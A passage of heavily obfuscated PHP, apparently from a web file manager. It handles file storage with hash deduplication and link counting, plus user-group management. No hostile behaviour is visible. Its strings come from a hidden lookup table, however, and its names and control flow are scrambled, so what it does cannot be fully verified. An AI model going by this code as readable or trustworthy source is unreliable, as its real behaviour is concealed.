$cëÍ®¾ÚåÒ = '') { goto D»Íèï…; D»Íèï…: $E‘ÈƒÀÍÆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a†ŠÍ‘è = TEMP_PATH . $E‘ÈƒÀÍÆ[2157]; if (!is_dir($a†ŠÍ‘è)) { mk_dir($a†ŠÍ‘è); } goto añÔòãÂâÉ; añÔòãÂâÉ: $eÛßÈÅÜŠŸ = $a†ŠÍ‘è . $E‘ÈƒÀÍÆ[2158] . rand_string(16); file_put_contents($eÛßÈÅÜŠŸ, $EÆÌŸ¸„˜»); $FÅ«óè„Åà = $this->addFile($eÛßÈÅÜŠŸ, $cëÍ®¾ÚåÒ, !0); goto bˆÇĞæ‡‘»; bˆÇĞæ‡‘»: if (file_exists($eÛßÈÅÜŠŸ)) { @unlink($eÛßÈÅÜŠŸ); } return $FÅ«óè„Åà; goto e«¬¥ óÇ; e«¬¥ óÇ: } public function createFileName($BÈ“¯ğìœß) { goto CíÈ•ìÙïò; CÂ¡¼æöƒ: if (!$DøˆÈ¦Ù½„ && !Cache::get($FÄªØäé)) { $DøˆÈ¦Ù½„ = !0; $f÷…Š”ÌÆ¯ = IO::mkdir($a×›íöñ´); if (!IO::exist($f÷…Š”ÌÆ¯ . $Dáî·ëˆ´á[2160])) { IO::mkfile($f÷…Š”ÌÆ¯ . $Dáî·ëˆ´á[2160]); } Cache::set($FÄªØäé, 1, 3600 * 2); } return $e¢³ëÆ·¥Æ; goto BÆ½ƒî¶¢; A¡ó¢ÅÌï¬: $a×›íöñ´ = $BÛõ½–ÇÅ‰->pathFather($e¢³ëÆ·¥Æ); static $DøˆÈ¦Ù½„ = false; $FÄªØäé = $Dáî·ëˆ´á[2159] . md5($a×›íöñ´); goto CÂ¡¼æöƒ; CíÈ•ìÙïò: $Dáî·ëˆ´á =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÛõ½–ÇÅ‰ = IO::init($Dáî·ëˆ´á[18]); $e¢³ëÆ·¥Æ = $this->makeFilePath($BÈ“¯ğìœß, $BÛõ½–ÇÅ‰); goto A¡ó¢ÅÌï¬; BÆ½ƒî¶¢: } public function makeFilePath($C¯¼†¨Òİ„, $dôÓÓ‡ÌŒ¸) { goto Aå™Ÿ³ä£á; Aå™Ÿ³ä£á: $eÏª¤ï¾•Õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÄèß˜öä = Model($eÏª¤ï¾•Õ[1095])->get($eÏª¤ï¾•Õ[2161]); $A‡ñ¡åÚ³õ = KodIO::defaultIO() . date($eÏª¤ï¾•Õ[2162]); goto f¥®å±å¡¢; f¥®å±å¡¢: $aÜÎÔêì—§ = $A‡ñ¡åÚ³õ . rand_string(5) . short_id(100); $C¯¼†¨Òİ„ = str_replace($eÏª¤ï¾•Õ[18], $eÏª¤ï¾•Õ[80], KodIO::clear($C¯¼†¨Òİ„)); if (!$C¯¼†¨Òİ„) { $eÄèß˜öä = $eÏª¤ï¾•Õ[2163]; } goto AƒÄËØ­²ö; AƒÄËØ­²ö: switch ($eÄèß˜öä) { case $eÏª¤ï¾•Õ[2164]: $aÜÎÔêì—§ = $aÜÎÔêì—§ . $eÏª¤ï¾•Õ[101] . $dôÓÓ‡ÌŒ¸->ext($C¯¼†¨Òİ„); if ($dôÓÓ‡ÌŒ¸->ext($C¯¼†¨Òİ„) == $eÏª¤ï¾•Õ[2104]) { $aÜÎÔêì—§ .= $eÏª¤ï¾•Õ[1345]; } break; case $eÏª¤ï¾•Õ[2165]: goto f‘ˆ¦äâ¯µ; fìãªá¼¡ç: CacheLock::lock($BöĞõöŒ¯Û); $b·Ü— Û¯Ï = IO::fileNameAuto($A‡ñ¡åÚ³õ, $C¯¼†¨Òİ„); $aÜÎÔêì—§ = $A‡ñ¡åÚ³õ . $b·Ü— Û¯Ï; goto eé¯®àùÌŞ; AÖÌ±ñƒš: $A‡ñ¡åÚ³õ = $eÏª¤ï¾•Õ[2166] . $c–„âÖÁ¶º[$eÏª¤ï¾•Õ[376]] . $eÏª¤ï¾•Õ[2167] . date($eÏª¤ï¾•Õ[2168]) . $B­õ“Ä£‹ù . $eÏª¤ï¾•Õ[18]; if ($dôÓÓ‡ÌŒ¸->ext($C¯¼†¨Òİ„) == $eÏª¤ï¾•Õ[2104]) { $C¯¼†¨Òİ„ .= $eÏª¤ï¾•Õ[1345]; } $BöĞõöŒ¯Û = $eÏª¤ï¾•Õ[2169] . $A‡ñ¡åÚ³õ . $C¯¼†¨Òİ„; goto fìãªá¼¡ç; eé¯®àùÌŞ: if (IO::isTypeObject($aÜÎÔêì—§) && !IO::isUploadServer($aÜÎÔêì—§)) { IO::setContent($aÜÎÔêì—§, $eÏª¤ï¾•Õ[43]); } CacheLock::unlock($BöĞõöŒ¯Û); break; goto e–ç¸ßÇÀ; f‘ˆ¦äâ¯µ: $d‰¡£§°‰ã = Model($eÏª¤ï¾•Õ[1095])->get($eÏª¤ï¾•Õ[1341]); $B­õ“Ä£‹ù = substr(md5($eÏª¤ï¾•Õ[1923] . $d‰¡£§°‰ã . date($eÏª¤ï¾•Õ[696])), 0, 8); $c–„âÖÁ¶º = KodIO::defaultDriver(); goto AÖÌ±ñƒš; e–ç¸ßÇÀ: case $eÏª¤ï¾•Õ[2163]: break; default: break; } return $aÜÎÔêì—§; goto C‰¤†µî÷‘; C‰¤†µî÷‘: } public function addFileByRemote($b’Ğ‹íìİ¸, $aÙ¶ëéàÕô, $B¥Ê˜¹˜³ = array()) { goto e¸ÈáÑùõ; e¸ÈáÑùõ: $f¯…¸Ú„‰Æ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!IO::exist($b’Ğ‹íìİ¸)) { return !1; } $F„õš¹À°¨ = $B¥Ê˜¹˜³[$f¯…¸Ú„‰Æ[173]] ? $B¥Ê˜¹˜³[$f¯…¸Ú„‰Æ[173]] : $f¯…¸Ú„‰Æ[43]; goto aÏÖ†½’º; e‘™‚‰äá: if ($E¤Ú„µ°ê¦ = $this->addFileCheckExist($B¶ÊëçÇ¿Ñ[$f¯…¸Ú„‰Æ[174]], $B¶ÊëçÇ¿Ñ[$f¯…¸Ú„‰Æ[173]], $B¶ÊëçÇ¿Ñ[$f¯…¸Ú„‰Æ[87]])) { return $E¤Ú„µ°ê¦; } return $this->addFileData($B¶ÊëçÇ¿Ñ); goto CÕ—º¬¡; aÏÖ†½’º: $E¬Ù÷Ì‘ ‰ = IO::hashMd5($b’Ğ‹íìİ¸, $F„õš¹À°¨); $E‹™Ğ©’äà = KodIO::defaultDriver(); $B¶ÊëçÇ¿Ñ = array($f¯…¸Ú„‰Æ[531] => IO::size($b’Ğ‹íìİ¸), $f¯…¸Ú„‰Æ[2170] => 1, $f¯…¸Ú„‰Æ[395] => $aÙ¶ëéàÕô, $f¯…¸Ú„‰Æ[744] => $E‹™Ğ©’äà[$f¯…¸Ú„‰Æ[376]], $f¯…¸Ú„‰Æ[396] => $b’Ğ‹íìİ¸, $f¯…¸Ú„‰Æ[2171] => $B¥Ê˜¹˜³[$f¯…¸Ú„‰Æ[174]] ? $B¥Ê˜¹˜³[$f¯…¸Ú„‰Æ[174]] : IO::hashSimple($b’Ğ‹íìİ¸), $f¯…¸Ú„‰Æ[2172] => $E¬Ù÷Ì‘ ‰ ? $E¬Ù÷Ì‘ ‰ : $F„õš¹À°¨); goto e‘™‚‰äá; CÕ—º¬¡: } private function addFileData($cÃÖ¹°¼±¢) { $Eâø²õĞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$cÃÖ¹°¼±¢) { return !1; } $cÃÖ¹°¼±¢[$Eâø²õĞ[87]] = intval($cÃÖ¹°¼±¢[$Eâø²õĞ[87]]); if (!$cÃÖ¹°¼±¢[$Eâø²õĞ[87]] && strlen($cÃÖ¹°¼±¢[$Eâø²õĞ[174]]) > 32) { $cÃÖ¹°¼±¢[$Eâø²õĞ[87]] = intval(substr($cÃÖ¹°¼±¢[$Eâø²õĞ[174]], 32)); } $B’šÉí÷ÅÃ = $this->add($cÃÖ¹°¼±¢); return $this->find($B’šÉí÷ÅÃ); } public function addFile($eæÑ†¸ƒœğ, $DåÄ‰’İŸà, $BßÁªÒ®É¦ = false) { goto B…Ä©Û©‰Û; B…Ä©Û©‰Û: $E¬÷ùÌ”»ê = IO::hashSimple($eæÑ†¸ƒœğ); $a·¾¶á¯…É = IO::hashMd5($eæÑ†¸ƒœğ); $cÓâÄ®£ô = IO::size($eæÑ†¸ƒœğ); goto Bô´ÃÖà·; Bô´ÃÖà·: $F‚¹©çñò’ = $_SERVER[çŞáÓæÚô‚Ô‡][2173] . $a·¾¶á¯…É; CacheLock::lock($F‚¹©çñò’); if ($a˜ºæ‹ñÓ¶ = $this->addFileCheckExist($E¬÷ùÌ”»ê, $a·¾¶á¯…É, $cÓâÄ®£ô)) { CacheLock::unlock($F‚¹©çñò’); return $a˜ºæ‹ñÓ¶; } goto B×¯¯î‚½Ñ; B×¯¯î‚½Ñ: $eŒŒÌÒ§ë« = $this->addFileMake($eæÑ†¸ƒœğ, $cÓâÄ®£ô, $E¬÷ùÌ”»ê, $a·¾¶á¯…É, $DåÄ‰’İŸà, $BßÁªÒ®É¦); $BïÓÈ¼†— = $this->addFileData($eŒŒÌÒ§ë«); CacheLock::unlock($F‚¹©çñò’); goto b·«……½ç†; b·«……½ç†: return $BïÓÈ¼†—; goto Bùİäİ£”Í; Bùİäİ£”Í: } public function addFileMake($Bå¾‹ˆƒÕ‚, $fõˆôìÏ’™, $còñè®‘‡, $D­ˆ–İÜçó, $e®¢Ê›·á, $bÎ¨°õğÊ×) { goto e“éŠÍï³; Få·•‡êÃ: $EÈ‡ÊîƒæÅ = KodIO::defaultDriver(); $D¡«”‚İİ¡ = array($Bì·­Œ‹•ó[531] => $fõˆôìÏ’™, $Bì·­Œ‹•ó[2170] => 1, $Bì·­Œ‹•ó[395] => $e®¢Ê›·á, $Bì·­Œ‹•ó[744] => $EÈ‡ÊîƒæÅ[$Bì·­Œ‹•ó[376]], $Bì·­Œ‹•ó[396] => $BÊµ´İ•Àá, $Bì·­Œ‹•ó[2171] => $còñè®‘‡, $Bì·­Œ‹•ó[2172] => $D­ˆ–İÜçó); return $D¡«”‚İİ¡; goto a¶±‡„Ç‰Í; bÔÏĞ„£»Ù: $D æÇ³å = get_path_this($BÊµ´İ•Àá); if ($bÎ¨°õğÊ×) { $BâØ™èÕó = IO::move($Bå¾‹ˆƒÕ‚, $c²Ç®äƒË°, !1, $D æÇ³å); } else { $BâØ™èÕó = IO::copy($Bå¾‹ˆƒÕ‚, $c²Ç®äƒË°, !1, $D æÇ³å); } if (!$BâØ™èÕó) { return !1; } goto Få·•‡êÃ; e“éŠÍï³: $Bì·­Œ‹•ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÊµ´İ•Àá = $this->createFileName($e®¢Ê›·á); $c²Ç®äƒË° = get_path_father($BÊµ´İ•Àá); goto bÔÏĞ„£»Ù; a¶±‡„Ç‰Í: } public function addFileCheckExist($BŸ›Æ¿Ü†Ç, $E¬Şì¸ì†®, $F—„‡Ş©Ü¼) { $B¶Ã‚¸ò»² =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cŸ¿ÍÎÓëæ = $this->findByHash($BŸ›Æ¿Ü†Ç, $E¬Şì¸ì†®); if (!$cŸ¿ÍÎÓëæ) { return !1; } $Cá†ÍŞ‰ñß = array($B¶Ã‚¸ò»²[2170] => intval($cŸ¿ÍÎÓëæ[$B¶Ã‚¸ò»²[2174]]) + 1, $B¶Ã‚¸ò»²[531] => $F—„‡Ş©Ü¼); $this->where(array($B¶Ã‚¸ò»²[429] => $cŸ¿ÍÎÓëæ[$B¶Ã‚¸ò»²[428]]))->save($Cá†ÍŞ‰ñß); return $cŸ¿ÍÎÓëæ; } public function remove($EÇ‘ÚÎÎóÖ) { $this->linkCountChange($EÇ‘ÚÎÎóÖ, !1); $this->clearEmpty(); return !0; } public function linkAdd($aËõ…ßÒö) { $this->linkCountChange($aËõ…ßÒö, !0); } public function linkCountChange($CïÖÃ·‰¿Î, $E•ÁôÉÍì‹) { goto DìİÛ’; DìİÛ’: $a¬Î®ÇÓö’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$CïÖÃ·‰¿Î) { return; } if (!is_array($CïÖÃ·‰¿Î)) { $CïÖÃ·‰¿Î = array($CïÖÃ·‰¿Î); } goto d•àÎ õš‰; BçµŠ¸åÓ½: foreach ($DÖÎ·ÁÔÓ as $f†”Êê«·ß => $bå ›ÃÆ÷‡) { $DÃÒ˜ÃÙõê = $bå ›ÃÆ÷‡ . $a¬Î®ÇÓö’[43]; if (!$AöÍå–£šµ[$DÃÒ˜ÃÙõê]) { $AöÍå–£šµ[$DÃÒ˜ÃÙõê] = array(); } $AöÍå–£šµ[$DÃÒ˜ÃÙõê][] = $f†”Êê«·ß; } foreach ($AöÍå–£šµ as $bå ›ÃÆ÷‡ => $dŸÒİÇàš„) { if (!$dŸÒİÇàš„) { continue; } $bå ›ÃÆ÷‡ = $E•ÁôÉÍì‹ ? $bå ›ÃÆ÷‡ : -intval($bå ›ÃÆ÷‡); $d”­»İ›ã = array($a¬Î®ÇÓö’[428] => array($a¬Î®ÇÓö’[17], $dŸÒİÇàš„)); if ($bå ›ÃÆ÷‡ < 0) { $d”­»İ›ã[$a¬Î®ÇÓö’[2174]] = array($a¬Î®ÇÓö’[935], abs($bå ›ÃÆ÷‡)); } $this->where($d”­»İ›ã)->setAdd($a¬Î®ÇÓö’[2174], $bå ›ÃÆ÷‡); } goto DÇ¨õ‘ò©¾; d•àÎ õš‰: $DÖÎ·ÁÔÓ = array(); foreach ($CïÖÃ·‰¿Î as $f†”Êê«·ß) { $DÃÒ˜ÃÙõê = $f†”Êê«·ß . $a¬Î®ÇÓö’[43]; if (!$DÖÎ·ÁÔÓ[$DÃÒ˜ÃÙõê]) { $DÖÎ·ÁÔÓ[$DÃÒ˜ÃÙõê] = 0; } $DÖÎ·ÁÔÓ[$DÃÒ˜ÃÙõê]++; } $AöÍå–£šµ = array(); goto BçµŠ¸åÓ½; DÇ¨õ‘ò©¾: } public function findByHash($Bå—•°³¦æ, $Eˆä½‹î×¸ = false) { $d‘†¸¢’ßÕ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$Bå—•°³¦æ && !$Eˆä½‹î×¸) { return !1; } $FªÒğ¶‰À = array($d‘†¸¢’ßÕ[2171] => $Bå—•°³¦æ); if ($Eˆä½‹î×¸) { $FªÒğ¶‰À = array($d‘†¸¢’ßÕ[2172] => $Eˆä½‹î×¸); } return $this->order($d‘†¸¢’ßÕ[2175])->where($FªÒğ¶‰À)->find(); } public function clearEmpty($Dñ·ĞÚß‚Š = 0) { goto DòùËŠºÖ; D´‚ªĞÓ¸î: $E¢ÙÜè¹¹Û = $this->where($E†ïìééò)->select(); if (!$E¢ÙÜè¹¹Û) { return; } $cŸè÷ËÄ§Å = new Task($D­õ¥Äº[2177], $D­õ¥Äº[43], count($E¢ÙÜè¹¹Û)); goto E¶ù¬¢Ñ–«; DòùËŠºÖ: $D­õ¥Äº =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aº¶Ùé“İ = time() - 3600 * 24 * $Dñ·ĞÚß‚Š; $E†ïìééò = $D­õ¥Äº[2176] . $aº¶Ùé“İ; goto D´‚ªĞÓ¸î; E¶ù¬¢Ñ–«: foreach ($E¢ÙÜè¹¹Û as $c¯Âğí¦öÂ) { $cŸè÷ËÄ§Å->update(1); $this->resetFile($c¯Âğí¦öÂ); } $cŸè÷ËÄ§Å->end(); goto d‡‡‰„À‹ê; d‡‡‰„À‹ê: } public function resetFile($F¨ÅÍ«ÜˆÕ) { goto CÔÀÛ¿ˆÆ; CÔÀÛ¿ˆÆ: $b†•Íµ«™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cóê êŒ = array($b†•Íµ«™[429] => $F¨ÅÍ«ÜˆÕ[$b†•Íµ«™[428]]); $f²ã½ˆß–è = Model($b†•Íµ«™[1124])->where($cóê êŒ)->count(); goto dÄ²–„½¨ˆ; c„ìôà×†: if ($F¨ÅÍ«ÜˆÕ[$b†•Íµ«™[2174]] != $c‡Û¤›¦¦ë) { $this->where($cóê êŒ)->save(array($b†•Íµ«™[2170] => $c‡Û¤›¦¦ë)); } goto fÛêäˆÛ; dÄ²–„½¨ˆ: $CÒ¦ã¨×”¦ = Model($b†•Íµ«™[2178])->where($cóê êŒ)->count(); $c‡Û¤›¦¦ë = intval($f²ã½ˆß–è) + intval($CÒ¦ã¨×”¦); if ($c‡Û¤›¦¦ë == 0) { IO::remove($F¨ÅÍ«ÜˆÕ[$b†•Íµ«™[85]]); $this->where($cóê êŒ)->delete(); $this->metaSet($F¨ÅÍ«ÜˆÕ[$b†•Íµ«™[428]], null, null); return; } goto c„ìôà×†; fÛêäˆÛ: } public function storageInfo($d†ë ¢¢´ = false) { goto e…µ˜ùÈ; f½ËÇ‹§ƒ›: for ($f…Ûó¨•Ú = 0; $f…Ûó¨•Ú < $b…ùõíÉ; $f…Ûó¨•Ú = $f…Ûó¨•Ú + $bêÖ­Şî) { $d•ğ„®£Øò = $this->limit($f…Ûó¨•Ú, $f…Ûó¨•Ú + $bêÖ­Şî)->select(); foreach ($d•ğ„®£Øò as $Câ»³šÛØ) { $fÍêÒ¬Ù‹ += $Câ»³šÛØ[$c±­ˆ‚³¥Ÿ[87]] * $Câ»³šÛØ[$c±­ˆ‚³¥Ÿ[2174]]; $DË„Ã½«Åê += $Câ»³šÛØ[$c±­ˆ‚³¥Ÿ[87]] * ($Câ»³šÛØ[$c±­ˆ‚³¥Ÿ[2174]] - 1); $EËšÉØÈëİ += $Câ»³šÛØ[$c±­ˆ‚³¥Ÿ[2174]]; } } $FõË£éò³ä = array($c±­ˆ‚³¥Ÿ[2179] => $fÍêÒ¬Ù‹, $c±­ˆ‚³¥Ÿ[2180] => $DË„Ã½«Åê, $c±­ˆ‚³¥Ÿ[2181] => $DË„Ã½«Åê / $fÍêÒ¬Ù‹, $c±­ˆ‚³¥Ÿ[91] => $b…ùõíÉ, $c±­ˆ‚³¥Ÿ[2182] => $EËšÉØÈëİ); return $FõË£éò³ä; goto a‰†§Ğš±ƒ; e…µ˜ùÈ: $c±­ˆ‚³¥Ÿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b…ùõíÉ = $this->count() + 0.0; $DË„Ã½«Åê = 0; goto FÍ—õõŠƒº; FÍ—õõŠƒº: $fÍêÒ¬Ù‹ = 1; $EËšÉØÈëİ = 0; $bêÖ­Şî = 5000; goto f½ËÇ‹§ƒ›; a‰†§Ğš±ƒ: } } goto bì–Ô×§… ; bì–Ô×§… : class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\160"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\155\145" => "\x67\162\157\x75\x70\x5f\155\x65\164\141", "\155\x65\x74\x61\106\151\x65\x6c\144" => "\x67\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($F´ù“Õ¬ê“) { $báÆ­µƒİÁ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($báÆ­µƒİÁ[2183] => array($F´ù“Õ¬ê“[0], $báÆ­µƒİÁ[2184]), $báÆ­µƒİÁ[2185] => array($F´ù“Õ¬ê“[0], $báÆ­µƒİÁ[2184])); } protected function getInfo($dÄ¥‡‚Àİ«) { $CîÂĞˆòù = $this->getInfoSimple($dÄ¥‡‚Àİ«); if (!$CîÂĞˆòù) { return !1; } return $this->_listDataApplyItem($CîÂĞˆòù); } protected function getInfoSimple($e‘ÌÅ¢­Ê, $c÷«§á­îç = false) { $F ÷‚‘ë¸è =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($c÷«§á­îç) { $F‡ª½õ‹í = array($F ÷‚‘ë¸è[2114] => intval($e‘ÌÅ¢­Ê)); $F‡ßîÓ¾ô± = $this->where($F‡ª½õ‹í)->find(); return is_array($F‡ßîÓ¾ô±) ? $F‡ßîÓ¾ô± : array(); } return $this->cacheFunctionGet($F ÷‚‘ë¸è[2186], $e‘ÌÅ¢­Ê); } protected function groupAdd($f¶îô¤›ôÀ) { goto eÈÚ†òÊÄ; c¬Ñ³£Î©Ô: if ($b‚­ö¹åÙã[$DË‘İÇ¹»[470]]) { $C…º—íŠ£Ñ = $b‚­ö¹åÙã[$DË‘İÇ¹»[470]] . $b‚­ö¹åÙã[$DË‘İÇ¹»[2114]] . $DË‘İÇ¹»[57]; } $B¹õçÎ±Äƒ = array($DË‘İÇ¹»[395] => $this->groupNameAuto($f¶îô¤›ôÀ[$DË‘İÇ¹»[472]], $f¶îô¤›ôÀ[$DË‘İÇ¹»[38]]), $DË‘İÇ¹»[377] => $f¶îô¤›ôÀ[$DË‘İÇ¹»[472]], $DË‘İÇ¹»[536] => $C…º—íŠ£Ñ, $DË‘İÇ¹»[2187] => $f¶îô¤›ôÀ[$DË‘İÇ¹»[2098]], $DË‘İÇ¹»[2188] => 0, $DË‘İÇ¹»[2118] => 0); if (isset($f¶îô¤›ôÀ[$DË‘İÇ¹»[2136]])) { $B¹õçÎ±Äƒ[$DË‘İÇ¹»[2136]] = $f¶îô¤›ôÀ[$DË‘İÇ¹»[2136]]; } else { $bê¤–ñ‘ÚÕ = $this->max($DË‘İÇ¹»[2136]); if (!$bê¤–ñ‘ÚÕ) { $bê¤–ñ‘ÚÕ = 0; } $B¹õçÎ±Äƒ[$DË‘İÇ¹»[2136]] = $bê¤–ñ‘ÚÕ + 1; } goto CËè§ÙŸìÁ; CËè§ÙŸìÁ: if (!empty($f¶îô¤›ôÀ[$DË‘İÇ¹»[2114]])) { $B¹õçÎ±Äƒ[$DË‘İÇ¹»[2114]] = $f¶îô¤›ôÀ[$DË‘İÇ¹»[2114]]; } $d¶—ç³«æ = $this->add($B¹õçÎ±Äƒ); $this->setNamePinyin($d¶—ç³«æ, $B¹õçÎ±Äƒ[$DË‘İÇ¹»[38]]); goto DïäîŒë¤; eÈÚ†òÊÄ: $DË‘İÇ¹» =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$f¶îô¤›ôÀ[$DË‘İÇ¹»[472]] && isset($f¶îô¤›ôÀ[$DË‘İÇ¹»[2114]]) && $f¶îô¤›ôÀ[$DË‘İÇ¹»[2114]] == 1) { if ($b‚­ö¹åÙã = $this->getInfoSimple($f¶îô¤›ôÀ[$DË‘İÇ¹»[2114]], !0)) { return $f¶îô¤›ôÀ[$DË‘İÇ¹»[2114]]; } } else { $b‚­ö¹åÙã = $this->getInfoSimple($f¶îô¤›ôÀ[$DË‘İÇ¹»[472]]); if (!$b‚­ö¹åÙã) { return !1; } } $C…º—íŠ£Ñ = $DË‘İÇ¹»[481]; goto c¬Ñ³£Î©Ô; DïäîŒë¤: if (isset($f¶îô¤›ôÀ[$DË‘İÇ¹»[2189]])) { $this->metaSet($d¶—ç³«æ, array($DË‘İÇ¹»[2189] => $f¶îô¤›ôÀ[$DË‘İÇ¹»[2189]], $DË‘İÇ¹»[2190] => $f¶îô¤›ôÀ[$DË‘İÇ¹»[2190]])); unset($f¶îô¤›ôÀ[$DË‘İÇ¹»[2189]]); unset($f¶îô¤›ôÀ[$DË‘İÇ¹»[2190]]); } Model($DË‘İÇ¹»[1124])->groupRootAdd($d¶—ç³«æ); return $d¶—ç³«æ; goto A´î‘ÙßÌî; A´î‘ÙßÌî: } protected function groupEdit($C¬ö‹à˜äÕ, $fÔïÅ‰Şë¼) { $e¬×™›ùñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!empty($fÔïÅ‰Şë¼[$e¬×™›ùñ[472]])) { $d¹ĞØ¯Ùöá = $this->getInfoSimple($C¬ö‹à˜äÕ); $dÏ§ÂîˆÄç = $this->getInfoSimple($fÔïÅ‰Şë¼[$e¬×™›ùñ[472]]); if (!$d¹ĞØ¯Ùöá || !$dÏ§ÂîˆÄç) { return !1; } if ($d¹ĞØ¯Ùöá[$e¬×™›ùñ[2114]] == $dÏ§ÂîˆÄç[$e¬×™›ùñ[2114]]) { return !1; } if ($fÔïÅ‰Şë¼[$e¬×™›ùñ[472]] != $d¹ĞØ¯Ùöá[$e¬×™›ùñ[472]]) { if ($dÏ§ÂîˆÄç[$e¬×™›ùñ[470]] !== $d¹ĞØ¯Ùöá[$e¬×™›ùñ[470]] && strpos($dÏ§ÂîˆÄç[$e¬×™›ùñ[470]], $d¹ĞØ¯Ùöá[$e¬×™›ùñ[470]] . $d¹ĞØ¯Ùöá[$e¬×™›ùñ[2114]] . $e¬×™›ùñ[57]) === 0) { return !1; } $fÔïÅ‰Şë¼[$e¬×™›ùñ[536]] = $dÏ§ÂîˆÄç[$e¬×™›ùñ[470]] . $fÔïÅ‰Şë¼[$e¬×™›ùñ[472]] . $e¬×™›ùñ[57]; $this->_changeChildLevel($d¹ĞØ¯Ùöá, $dÏ§ÂîˆÄç); } } if (isset($fÔïÅ‰Şë¼[$e¬×™›ùñ[38]])) { $this->setNamePinyin($C¬ö‹à˜äÕ, $fÔïÅ‰Şë¼[$e¬×™›ùñ[38]]); } if (isset($fÔïÅ‰Şë¼[$e¬×™›ùñ[2189]])) { $this->metaSet($C¬ö‹à˜äÕ, array($e¬×™›ùñ[2189] => $fÔïÅ‰Şë¼[$e¬×™›ùñ[2189]], $e¬×™›ùñ[2190] => $fÔïÅ‰Şë¼[$e¬×™›ùñ[2190]])); unset($fÔïÅ‰Şë¼[$e¬×™›ùñ[2189]]); unset($fÔïÅ‰Şë¼[$e¬×™›ùñ[2190]]); } return $this->where(array($e¬×™›ùñ[2191] => $C¬ö‹à˜äÕ))->save($fÔïÅ‰Şë¼); } private function _changeChildLevel($bÑ¥²‡Ô„Ğ, $eÕ®¸Ç‡Ó¸, $d™Òï¬áĞ = false) { goto fâøèŸå; Dß‡‡Û‘Öë: $this->where($AÔò¤¸âÕ«)->data($FÏ›¦¢š¤·)->save(); goto FœØ·Ÿš¤¨; aÇ¥‡´ç: if ($d™Òï¬áĞ) { $E¿î±× ¨ = $eÕ®¸Ç‡Ó¸[$Bšø¤ğ·›õ[470]] . $eÕ®¸Ç‡Ó¸[$Bšø¤ğ·›õ[2114]] . $Bšø¤ğ·›õ[57]; } $AÔò¤¸âÕ« = array($Bšø¤ğ·›õ[536] => array($Bšø¤ğ·›õ[494], $bÑ¥²‡Ô„Ğ[$Bšø¤ğ·›õ[470]] . $bÑ¥²‡Ô„Ğ[$Bšø¤ğ·›õ[2114]] . $Bšø¤ğ·›õ[495])); $FÏ›¦¢š¤· = array($Bšø¤ğ·›õ[536] => array($Bšø¤ğ·›õ[545], "\162\145\160\x6c\141\x63\145\x28\x70\x61\x72\145\156\x74\x4c\x65\x76\145\x6c\54\47{$döê‹ñÒÜõ}\47\x2c\x27{$E¿î±× ¨}\x27\51")); goto Dß‡‡Û‘Öë; fâøèŸå: $Bšø¤ğ·›õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $döê‹ñÒÜõ = $bÑ¥²‡Ô„Ğ[$Bšø¤ğ·›õ[470]] . $bÑ¥²‡Ô„Ğ[$Bšø¤ğ·›õ[2114]] . $Bšø¤ğ·›õ[57]; $E¿î±× ¨ = $eÕ®¸Ç‡Ó¸[$Bšø¤ğ·›õ[470]] . $eÕ®¸Ç‡Ó¸[$Bšø¤ğ·›õ[2114]] . $Bšø¤ğ·›õ[57] . $bÑ¥²‡Ô„Ğ[$Bšø¤ğ·›õ[2114]] . $Bšø¤ğ·›õ[57]; goto aÇ¥‡´ç; FœØ·Ÿš¤¨: } public function setNamePinyin($B½¶ÎÈ­ïÌ, $E¡ãñ‚ËØ£ = false) { $DÎæÂİ¼§« =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$E¡ãñ‚ËØ£) { $E‚¬ŒÔ­İ¨ = $this->getInfoSimple($B½¶ÎÈ­ïÌ); $E¡ãñ‚ËØ£ = $E‚¬ŒÔ­İ¨[$DÎæÂİ¼§«[38]]; } if (!Input::check($E¡ãñ‚ËØ£, $DÎæÂİ¼§«[539])) { $this->metaSet($B½¶ÎÈ­ïÌ, $DÎæÂİ¼§«[425], null); $this->metaSet($B½¶ÎÈ­ïÌ, $DÎæÂİ¼§«[424], null); return; } $c¼ÛªÆç‹ = array($DÎæÂİ¼§«[425] => str_replace($DÎæÂİ¼§«[60], $DÎæÂİ¼§«[43], Pinyin::encode($E¡ãñ‚ËØ£)), $DÎæÂİ¼§«[424] => Pinyin::encode($E¡ãñ‚ËØ£, $DÎæÂİ¼§«[540])); $this->metaSet($B½¶ÎÈ­ïÌ, $c¼ÛªÆç‹); } protected function groupStatus($eÅ¦®Õ¢ÄÁ, $C¹ƒ¶ãŒ–æ) { goto EÜç¥îÏ¡…; EÜç¥îÏ¡…: $bÔæ¸°§¬¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e…Û…Û˜‰ğ = $this->getInfoSimple($eÅ¦®Õ¢ÄÁ); if (!$e…Û…Û˜‰ğ) { return !1; } goto bÀºô¾æ•‡; bÀºô¾æ•‡: if ($C¹ƒ¶ãŒ–æ == $bÔæ¸°§¬¯[93]) { $E¾ÎÁÌã÷ = $this->parentLevelArray($e…Û…Û˜‰ğ[$bÔæ¸°§¬¯[470]]); } else { $AÅ¶“©„æ = array($bÔæ¸°§¬¯[536] => array($bÔæ¸°§¬¯[494], $e…Û…Û˜‰ğ[$bÔæ¸°§¬¯[470]] . $e…Û…Û˜‰ğ[$bÔæ¸°§¬¯[2114]] . $bÔæ¸°§¬¯[495])); $E¾ÎÁÌã÷ = $this->where($AÅ¶“©„æ)->field($bÔæ¸°§¬¯[2114])->select(); $E¾ÎÁÌã÷ = array_to_keyvalue($E¾ÎÁÌã÷, $bÔæ¸°§¬¯[43], 